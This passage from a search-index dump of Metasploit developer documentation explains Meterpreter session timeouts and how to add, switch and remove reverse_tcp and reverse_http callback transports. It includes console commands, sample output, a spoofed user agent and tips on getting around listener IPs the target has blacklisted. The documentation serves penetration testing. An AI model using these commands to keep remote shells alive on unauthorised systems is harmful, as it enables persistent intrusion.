to have Meterpreter run for as long as it can, then setting this value to zero is the way to do it. It's important to note that this value lives outside of the realms of the other timeout values. That is, this value applies to Meterpreter as a whole, where the other three timeouts are specific to the individual transports that have been configured within the session.","title":"Meterpreter Session Timeout"},{"location":"dev/dark/Meterpreter-Timeout-Control/#meterpreter-transport-timeouts","text":"Each transport that is configured inside Meterpreter has three timeouts. The are as follows:","title":"Meterpreter Transport Timeouts"},{"location":"dev/dark/Meterpreter-Timeout-Control/#communication-timeout","text":"When Meterpreter talks to Metasploit packets are exchanged at a low level in a request/response fashion. In the case of TCP transports, this req/rep pattern is basically instant because TCP is a persistent connection. A request is handled by Meterpreter, and the response is immediately transferred as soon as the command has finished executing. In the case of HTTP/S payloads it's slightly different because the protocols are stateless. Meterpreter makes a GET request to Metasploit to check to see if a command has been executed by the user. The command is returned, the connection is closed, and Meterpreter executes the command asynchronously. When the command execution finishes, a second request is made that POST s the result back to Metasploit so that the user can consume it. Hence, for each command invocation, there are two HTTP/S requests. With TCP transports, communication \"times out\" when the time between the last packet and the current socket poll is greater than the communications timeout value. This happens when there are network related issues that prevent data from being transmitted between the two endpoints, but doesn't cause the socket to completely disconnect. With HTTP/S transports, the communication \"times out\" for the same reason, but the evaluation of the condition is slightly different in that failure can occur because there is either no response at all from the remote server, or the response to a GET request results in no acknowledgement. By default, this value is set to 300 seconds ( 5 minutes), but can be overidden by the user via the SessionCommunicationTimeout setting. If connectivity fails, or the communication is deemed to have timed out. Then the current transport is destroyed, and the next transport in the list of transports is invoked. From there, Meterpreter will use the Retry Total and Retry Wait values while attempting to re-establish a session with Metasploit.","title":"Communication Timeout"},{"location":"dev/dark/Meterpreter-Timeout-Control/#retry-total-and-retry-wait","text":"After a transport initialises inside Meterpreter, Meterpreter uses this transport to attempt to establish a new session with Metasploit. In some cases, Metasploit might not be availalble due to reasons like bad network connectivity, or a lack of configured listeners. If Meterpreter can't connect to Metasploit, it will attempt to retry for a period of time. Once that period of time expires, Meterpreter will deem this transport \"dead\" and will move to the next one in the transport list. The total amount of time that Meterpreter will attempt to connect back to Metasploit on the given transport is indicated by the retry total value. That is, retry total is the total amount of time that Meterpreter will retry communication on the transport. The default value is 3600 seconds ( 1 hour), and can be overridden via the SessionRetryTotal setting. While the current time is within the retry total time, Meterpreter will constantly attempt to establish connectivity. If it fails, it will wait for a period of time before trying again. The time between retry attempts on the current transport is called retry wait . That is, Meterpreter will wait for the number of seconds specified in retry wait between each connection attempt on the current transport. The default value is 10 seconds, and can be overridden via the SessionRetryWait setting.","title":"Retry Total and Retry Wait"},{"location":"dev/dark/Meterpreter-Timeout-Control/#changing-timeouts","text":"Meterpreter supports the querying and updating of each of these timeouts via the console. In order to get the current timeout settings, users can invoke the get_timeouts command, which returns all four of the current timeout settings (one for the global session, and three for the transport-specific settings). An example of which is shown below: meterpreter > get_timeouts Session Expiry : @ 2015-06-09 19:56:05 Comm Timeout : 100000 seconds Retry Total Time: 50000 seconds Retry Wait Time : 2500 seconds The Session Expiry value is rendered as an absolute local time so that the user knows when the session is due to expire. In order to update these values, users can invoke the set_timeouts command. Invoking it without parameters shows the help: meterpreter > set_timeouts Usage: set_timeouts [options] Set the current timeout options. Any or all of these can be set at once. OPTIONS: -c <opt> Comms timeout (seconds) -h Help menu -t <opt> Retry total time (seconds) -w <opt> Retry wait time (seconds) -x <opt> Expiration timout (seconds) As the help implies, each of these settings takes a value that indicates the number of seconds. Each of the options of this command are optional, so the user can update only those values that they are interested in updating. When the command is invoked, Meterpreter is updated, and the result shows the updated values once the changes have been made. In the case of the -x parameter, the value that is to be passed in should represent the total number of seconds from \"now\" until the session should expire. The following example updates the session expiration timeout to be 2 minutes from \"now\", and changes the retry wait time to 3 seconds: meterpreter > set_timeouts -x 120 -t 3 Session Expiry : @ 2015-06-02 22:45:13 Comm Timeout : 100000 seconds Retry Total Time: 3 seconds Retry Wait Time : 2500 seconds This command can be invoked any number of times while the session is valid, but as soon as the session has expired, Metepreter will shut down and it's game over: meterpreter > [*] 10.1.10.35 - Meterpreter session 2 closed. Reason: Died","title":"Changing Timeouts"},{"location":"dev/dark/Meterpreter-Transport-Control/","text":"The Meterpreter that we have known and loved for years has always had the ability to specify the type of transport that is to be used for the session. reverse_tcp and reverse_https appear to be the favourites. While this is very useful, the flexibility for transport selection has only been available at the time the payloads are created, or the exploit is launched, effectively locking the Meterpreter session into a single type of transport for the entire session lifetime. Recent modifications to Meterpreter have changed this. Meterpreter has a new configuration system that supports multiple transports, and behind the scenes it now supports the addition of new transports on the fly while the session is still running . With the extra transports configured, Meterpreter allows the user to cycle through those transports without shutting down the session. Not only that, but Meterpreter will cycle through these transports automatically when communication fails. For more information on the session resiliency features, please view the Reliable Network documentation . This document describes how multiple transports are added on the fly to an existing Meterpreter session. Transport configuration At this point in time it is not possible to add multiple transports to payloads or exploits prior to launching them. This is due to the fact that msfvenom the built-in payload mechanisms in Metasploit need to be modified to allow for multiple transports to be selected prior to the generation of the payload. This work is ongoing, and hopefully it'll be implemented soon. In the mean time, a single transport has to be chosen, using the same mechanism that has always been in use. The transport command Meterpreter now has a new base command called transport . This is the hub of all transport-related commands and will allow you to list them, add new ones, cycle through them on the fly, and remove those which are no longer valid or useful. The following output shows the current help text for the transport command: meterpreter > transport Usage: transport <list|change|add|next|prev|remove> [options] list: list the currently active transports. add: add a new transport to the transport list. change: same as add, but changes directly to the added entry. next: jump to the next transport in the list (no options). prev: jump to the previous transport in the list (no options). remove: remove an existing, non-active transport. OPTIONS: -A <opt> User agent for HTTP/S transports (optional) -B <opt> Proxy type for HTTP/S transports (optional: http, socks; default: http) -C <opt> Comms timeout (seconds) (default: same as current session) -H <opt> Proxy host for HTTP/S transports (optional) -N <opt> Proxy password for HTTP/S transports (optional) -P <opt> Proxy port for HTTP/S transports (optional) -T <opt> Retry total time (seconds) (default: same as current session) -U <opt> Proxy username for HTTP/S transports (optional) -W <opt> Retry wait time (seconds) (default: same as current session) -X <opt> Expiration timout (seconds) (default: same as current session) -c <opt> SSL certificate path for https transport verification (optional) -h Help menu -i <opt> Specify transport by index (currently supported: remove) -l <opt> LHOST parameter (for reverse transports) -p <opt> LPORT parameter -t <opt> Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp -u <opt> Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI) -v Show the verbose format of the transport list Clearly there's quite a few nuances to this command, and the best way to explain them is with a set of examples. Listing transports The simplest of all the sub-commands in the transport set is list . This command shows the full list of currently enabled transport, and an indicator of which one is the \"current\" transport. The following shows the non-verbose output with just the default transport running: meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 The first part of the output is the session expiry time. Details of what this is and why it's relevant can be found in the Timeout documentation . The above output shows that we have one transport enabled that is using TCP . We can infer that the transport was a reverse_tcp (rather than bind_tcp ) due to the fact that there is a host IP address in the transport URL. If it was a bind_tcp , this would be blank. Comms T/O refers to the communications timeout value. Retry Total is the total time to attempt reconnects on this transport, and Retry Wait indicates how often a retry of the current transport should happen. Each of these is documented in depth in the Timeout documentation . The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as reverse_http/s ). The following command shows the output of the list sub-command with the verbose flag ( -v ) after an HTTP transport has been added: meterpreter > transport list -v Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait User Agent Proxy Host Proxy User Proxy Pass Cert Hash ---- --- --------- ----------- ---------- ---------- ---------- ---------- ---------- --------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 Totes-Legit Browser/1.1 Adding transports Adding transports is the hot new thing. It gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added. The following command shows a simple example that adds a reverse_http transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests: meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A \"Totes-Legit Browser/1.1\" [*] Adding new transport ... [+] Successfully added reverse_http transport. This command is what was used to create the transport that was listed in the sample verbose output for the transport list command. Here's a deeper explanation of the parameters: The -t option is what tells Metasploit what type of transport to add. The options are bind_tcp , reverse_tcp , reverse_http and reverse_https . These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no reverse_winhttps because Meterpreter always uses the WinHTTP API behind the scenes anyway. The -l option specifies what we all know as the LHOST parameter. The -p option specifies what we all know as the LPORT parameter. The -T option matches the retry total parameter. The measure of this value is in seconds, and should be a positive integer that is more than -W . The -W option matches the retry wait parameter. The measure of this value is in seconds, and should be a positive integer that is less than -T . The -C option matches the communication timeout . The measure of this value is in seconds, and should be a positive integer. The -A specifies a custom user agent that is used for HTTP requests. It is also possible to specify the following: The -u option allows the addition of a local URI ( LURI ) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI. The -H option specifies a proxy host/IP. This parameter is optional. The -B option specifies a proxy type, and needs to be set to http or socks . If not specified alongside the -H parameter, the default type is http . The -P option specifies the port that the proxy is listening on. This should be set when -H is set. The -U option specifies the username to use to authenticate with the proxy. This parameter is optional. The -N option specifies the password to use to authenticate with the proxy. This parameter is optional. The -X option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use. Finally the -c parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in PEM format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn't exist, or doesn't contain a valid certificate, then the request should fail. The following shows another example which adds another reverse_tcp transport to the transport list: meterpreter > transport add -t reverse_tcp -l 10.1.10.40 -p 5005 [*] Adding new transport ... [+] Successfully added reverse_tcp transport. meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the end of the list, and not the start. Changing transports There are three different ways to change transports, each of which has it's own nuance. However, one thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no such listener/handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport in the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the session resiliency documentation (link coming soon). The three different ways to change transports are: transport next - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports. transport prev - This command is the same as transport next , except that it will move to the previous transport in the list, and not the next one. transport change ... - This command is functionally equivalent to running transport add , and hence requires all the parameters that transport add requires (resulting in a new transport at the end of the list), and then transport prev (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it. As an example, here is the current transport setup: meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 Moving to the next transport: meterpreter > transport next [*] Changing to next transport ... [+] Successfully changed to the next transport, killing current session. [*] 10.1.10.35 - Meterpreter session 1 closed. Reason: User exit msf exploit(handler) > [*] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [*] Meterpreter session 2 opened (10.1.10.40:5105 -> 10.1.10.40:46130) at 2015-06-02 20:53:54 +1000 msf exploit(handler) > sessions -i 2 [*] Starting interaction with 2... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 This output shows that we moved from the original reverse_tcp to the reverse_http transport, and this is now the current transport. Moving to the next transport again takes the session to the second reverse_tcp listener: meterpreter > transport next [*] Changing to next transport ... [+] Successfully changed to the next transport, killing current session. [*] 10.1.10.35 - Meterpreter session 2 closed. Reason: User exit msf exploit(handler) > [*] Meterpreter session 3 opened (10.1.10.40:5005 -> 10.1.10.35:49277) at 2015-06-02 20:54:45 +1000 msf exploit(handler) > sessions -i 3 [*] Starting interaction with 3... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:06 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 From here, moving backwards sends Meterpreter back to the reverse_http listener: meterpreter > transport prev [*] Changing to previous transport ... [*] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [+] Successfully changed to the previous transport, killing current session. [*] 10.1.10.35 - Meterpreter session 3 closed. Reason: User exit msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:5105 -> 10.1.10.40:46245) at 2015-06-02 20:55:07 +1000 msf exploit(handler) > sessions -i 4 [*] Starting interaction with 4... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 Removing transports It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on stageless listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by your target as a result of your post-exploitation shenanigans. The command is similar to add in that it takes a subset of the parameters, and then adds a new one on top of it: -t - The transport type. -l - The LHOST value (unless it's bind_tcp ). -p - The LPORT value. -u - This value is only required for reverse_http/s transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions. [*] Starting interaction with 2... meterpreter > transport list Session Expiry : @ 2015-07-10 07:39:08 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5000 300 3600 10 http://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/ 300 3600 10 meterpreter > transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ [*] Removing transport ... [+] Successfully removed reverse_http transport. meterpreter > transport list Session Expiry : @ 2015-07-10 07:39:08 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5000 300 3600 10 meterpreter > Resilient transports Prior to the recent changes, Meterpreter only had built-in resiliency in the HTTP/S payloads and this was due the nature of HTTP/S as a stateless protocol. Meterpreter now has resiliency features baked into TCP transports as well, both reverse and bind . If communication fails on a given transport, Meterpreter will roll over to the next one automatically. The following shows Metasploit being closed and leaving the existing TCP session running behind the scenes: meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 meterpreter > background [*] Backgrounding session 5... msf exploit(handler) > exit -y With Metasploit closed, the Meterpreter session has detected that the transport is no longer functioning. Behind the scenes, Meterpreter has shut down this TCP transport, and has automatically moved over to the HTTP transport as this was the next transport in the list. From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings. The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically: ./msfconsole -r ~/msf.rc [*] Starting the Metasploit Framework console...| IIIIII dTb.dTb _.---._ II 4' v 'B .'\"\".'/|\\`.\"\"'. II 6. .P : .' / | \\ `. : II 'T;. .;P' '.' / | \\ `.' II 'T; ;P' `. / | \\ .' IIIIII 'YvP' `-.__|__.-' I love shells --egypt =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]] + -- --=[ 1460 exploits - 835 auxiliary - 229 post ] + -- --=[ 426 payloads - 37 encoders - 8 nops ] + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ] ... snip ... [*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [*] Meterpreter session 1 opened (10.1.10.40:5105 -> 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000 msf exploit(handler) > sessions -l Active sessions =============== Id Type Information Connection -- ---- ----------- ---------- 1 meterpreter x86/win32 WIN-S45GUQ5KGVK\\OJ @ WIN-S45GUQ5KGVK 10.1.10.40:5105 -> 10.1.10.40:46457 (10.1.10.35) msf exploit(handler) > sessions -i 1 [*] Starting interaction with 1... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 The session is back up and running as if nothing had gone wrong. In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter's transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there's a list of one transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both TCP and HTTP/S . For important detail on network resiliency, please see the reliable network communication documentation . Supported Meterpreters The following Meterpreter implementations currently support the transport commands: Windows x86 Windows x64 POSIX x86 Android Java Python","title":"Meterpreter Transport Control"},{"location":"dev/dark/Meterpreter-Transport-Control/#transport-configuration","text":"At this point in time it is not possible to add multiple transports to payloads or exploits prior to launching them. This is due to the fact that msfvenom the built-in payload mechanisms in Metasploit need to be modified to allow for multiple transports to be selected prior to the generation of the payload. This work is ongoing, and hopefully it'll be implemented soon. In the mean time, a single transport has to be chosen, using the same mechanism that has always been in use.","title":"Transport configuration"},{"location":"dev/dark/Meterpreter-Transport-Control/#the-transport-command","text":"Meterpreter now has a new base command called transport . This is the hub of all transport-related commands and will allow you to list them, add new ones, cycle through them on the fly, and remove those which are no longer valid or useful. The following output shows the current help text for the transport command: meterpreter > transport Usage: transport <list|change|add|next|prev|remove> [options] list: list the currently active transports. add: add a new transport to the transport list. change: same as add, but changes directly to the added entry. next: jump to the next transport in the list (no options). prev: jump to the previous transport in the list (no options). remove: remove an existing, non-active transport. OPTIONS: -A <opt> User agent for HTTP/S transports (optional) -B <opt> Proxy type for HTTP/S transports (optional: http, socks; default: http) -C <opt> Comms timeout (seconds) (default: same as current session) -H <opt> Proxy host for HTTP/S transports (optional) -N <opt> Proxy password for HTTP/S transports (optional) -P <opt> Proxy port for HTTP/S transports (optional) -T <opt> Retry total time (seconds) (default: same as current session) -U <opt> Proxy username for HTTP/S transports (optional) -W <opt> Retry wait time (seconds) (default: same as current session) -X <opt> Expiration timout (seconds) (default: same as current session) -c <opt> SSL certificate path for https transport verification (optional) -h Help menu -i <opt> Specify transport by index (currently supported: remove) -l <opt> LHOST parameter (for reverse transports) -p <opt> LPORT parameter -t <opt> Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp -u <opt> Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI) -v Show the verbose format of the transport list Clearly there's quite a few nuances to this command, and the best way to explain them is with a set of examples.","title":"The transport command"},{"location":"dev/dark/Meterpreter-Transport-Control/#listing-transports","text":"The simplest of all the sub-commands in the transport set is list . This command shows the full list of currently enabled transport, and an indicator of which one is the \"current\" transport. The following shows the non-verbose output with just the default transport running: meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 The first part of the output is the session expiry time. Details of what this is and why it's relevant can be found in the Timeout documentation . The above output shows that we have one transport enabled that is using TCP . We can infer that the transport was a reverse_tcp (rather than bind_tcp ) due to the fact that there is a host IP address in the transport URL. If it was a bind_tcp , this would be blank. Comms T/O refers to the communications timeout value. Retry Total is the total time to attempt reconnects on this transport, and Retry Wait indicates how often a retry of the current transport should happen. Each of these is documented in depth in the Timeout documentation . The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as reverse_http/s ). The following command shows the output of the list sub-command with the verbose flag ( -v ) after an HTTP transport has been added: meterpreter > transport list -v Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait User Agent Proxy Host Proxy User Proxy Pass Cert Hash ---- --- --------- ----------- ---------- ---------- ---------- ---------- ---------- --------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 Totes-Legit Browser/1.1","title":"Listing transports"},{"location":"dev/dark/Meterpreter-Transport-Control/#adding-transports","text":"Adding transports is the hot new thing. It gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added. The following command shows a simple example that adds a reverse_http transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests: meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A \"Totes-Legit Browser/1.1\" [*] Adding new transport ... [+] Successfully added reverse_http transport. This command is what was used to create the transport that was listed in the sample verbose output for the transport list command. Here's a deeper explanation of the parameters: The -t option is what tells Metasploit what type of transport to add. The options are bind_tcp , reverse_tcp , reverse_http and reverse_https . These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no reverse_winhttps because Meterpreter always uses the WinHTTP API behind the scenes anyway. The -l option specifies what we all know as the LHOST parameter. The -p option specifies what we all know as the LPORT parameter. The -T option matches the retry total parameter. The measure of this value is in seconds, and should be a positive integer that is more than -W . The -W option matches the retry wait parameter. The measure of this value is in seconds, and should be a positive integer that is less than -T . The -C option matches the communication timeout . The measure of this value is in seconds, and should be a positive integer. The -A specifies a custom user agent that is used for HTTP requests. It is also possible to specify the following: The -u option allows the addition of a local URI ( LURI ) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI. The -H option specifies a proxy host/IP. This parameter is optional. The -B option specifies a proxy type, and needs to be set to http or socks . If not specified alongside the -H parameter, the default type is http . The -P option specifies the port that the proxy is listening on. This should be set when -H is set. The -U option specifies the username to use to authenticate with the proxy. This parameter is optional. The -N option specifies the password to use to authenticate with the proxy. This parameter is optional. The -X option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use. Finally the -c parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in PEM format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn't exist, or doesn't contain a valid certificate, then the request should fail. The following shows another example which adds another reverse_tcp transport to the transport list: meterpreter > transport add -t reverse_tcp -l 10.1.10.40 -p 5005 [*] Adding new transport ... [+] Successfully added reverse_tcp transport. meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the end of the list, and not the start.","title":"Adding transports"},{"location":"dev/dark/Meterpreter-Transport-Control/#changing-transports","text":"There are three different ways to change transports, each of which has it's own nuance. However, one thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no such listener/handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport in the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the session resiliency documentation (link coming soon). The three different ways to change transports are: transport next - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports. transport prev - This command is the same as transport next , except that it will move to the previous transport in the list, and not the next one. transport change ... - This command is functionally equivalent to running transport add , and hence requires all the parameters that transport add requires (resulting in a new transport at the end of the list), and then transport prev (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it. As an example, here is the current transport setup: meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 Moving to the next transport: meterpreter > transport next [*] Changing to next transport ... [+] Successfully changed to the next transport, killing current session. [*] 10.1.10.35 - Meterpreter session 1 closed. Reason: User exit msf exploit(handler) > [*] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [*] Meterpreter session 2 opened (10.1.10.40:5105 -> 10.1.10.40:46130) at 2015-06-02 20:53:54 +1000 msf exploit(handler) > sessions -i 2 [*] Starting interaction with 2... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 This output shows that we moved from the original reverse_tcp to the reverse_http transport, and this is now the current transport. Moving to the next transport again takes the session to the second reverse_tcp listener: meterpreter > transport next [*] Changing to next transport ... [+] Successfully changed to the next transport, killing current session. [*] 10.1.10.35 - Meterpreter session 2 closed. Reason: User exit msf exploit(handler) > [*] Meterpreter session 3 opened (10.1.10.40:5005 -> 10.1.10.35:49277) at 2015-06-02 20:54:45 +1000 msf exploit(handler) > sessions -i 3 [*] Starting interaction with 3... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:06 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 From here, moving backwards sends Meterpreter back to the reverse_http listener: meterpreter > transport prev [*] Changing to previous transport ... [*] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [+] Successfully changed to the previous transport, killing current session. [*] 10.1.10.35 - Meterpreter session 3 closed. Reason: User exit msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:5105 -> 10.1.10.40:46245) at 2015-06-02 20:55:07 +1000 msf exploit(handler) > sessions -i 4 [*] Starting interaction with 4... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10","title":"Changing transports"},{"location":"dev/dark/Meterpreter-Transport-Control/#removing-transports","text":"It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on stageless listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by 